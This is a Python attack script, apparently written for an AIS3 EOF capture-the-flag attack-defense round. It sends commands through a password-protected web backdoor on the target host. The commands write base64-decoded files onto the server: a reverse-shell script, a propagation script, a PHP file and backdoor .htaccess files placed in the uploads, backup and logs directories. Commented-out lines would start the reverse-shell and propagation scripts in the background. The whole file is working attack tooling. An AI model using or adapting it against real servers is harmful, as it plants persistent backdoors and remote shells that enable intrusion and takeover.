import requests
import base64

#URL_BASE = "http://127.0.0.1:13337/"
URL_BASE = "http://chals2.eof.ais3.org:30022/"

with open("mywaf.php", "rb") as f:
        waf = f.read()
        waf = base64.b64encode(waf)
        wafcmd = "echo '%s' | base64 -d - > /var/www/html/logs/w"%waf.decode()
        print(wafcmd)
        requests.post(URL_BASE, data={"p": "k9PEKg@Mw&mjVxh49en@", "w": wafcmd})

with open("myrev.sh", "rb") as f:
        waf = f.read()
        waf = base64.b64encode(waf)
        wafcmd = "echo '%s' | base64 -d - > /tmp/rev.sh"%waf.decode()
        print(wafcmd)
        requests.post(URL_BASE, data={"p": "k9PEKg@Mw&mjVxh49en@", "w": wafcmd})
        #requests.post(URL_BASE, data={"p": "k9PEKg@Mw&mjVxh49en@", "w": 'nohup bash /tmp/rev.sh &'})

with open("myprop.sh", "rb") as f:
        waf = f.read()
        waf = base64.b64encode(waf)
        wafcmd = "echo '%s' | base64 -d - > /tmp/prop.sh"%waf.decode()
        print(wafcmd)
        requests.post(URL_BASE, data={"p": "k9PEKg@Mw&mjVxh49en@", "w": wafcmd})
        #requests.post(URL_BASE, data={"p": "k9PEKg@Mw&mjVxh49en@", "w": 'nohup bash /tmp/prop.sh &'})

with open("backdoor_htaccess", "rb") as f:
        waf = f.read()
        waf = base64.b64encode(waf)
        wafcmd = "echo '%s' | base64 -d - > /var/www/html/uploads/.htaccess"%waf.decode()
        print(wafcmd)
        requests.post(URL_BASE, data={"p": "k9PEKg@Mw&mjVxh49en@", "w": wafcmd})
with open("backdoor_htaccess", "rb") as f:
        waf = f.read()
        waf = base64.b64encode(waf)
        wafcmd = "echo '%s' | base64 -d - > /var/www/html/backup/.htaccess"%waf.decode()
        print(wafcmd)
        requests.post(URL_BASE, data={"p": "k9PEKg@Mw&mjVxh49en@", "w": wafcmd})
with open("backdoor_htaccess", "rb") as f:
        waf = f.read()
        waf = base64.b64encode(waf)
        wafcmd = "echo '%s' | base64 -d - > /var/www/html/logs/.htaccess"%waf.decode()
        print(wafcmd)
        requests.post(URL_BASE, data={"p": "k9PEKg@Mw&mjVxh49en@", "w": wafcmd})
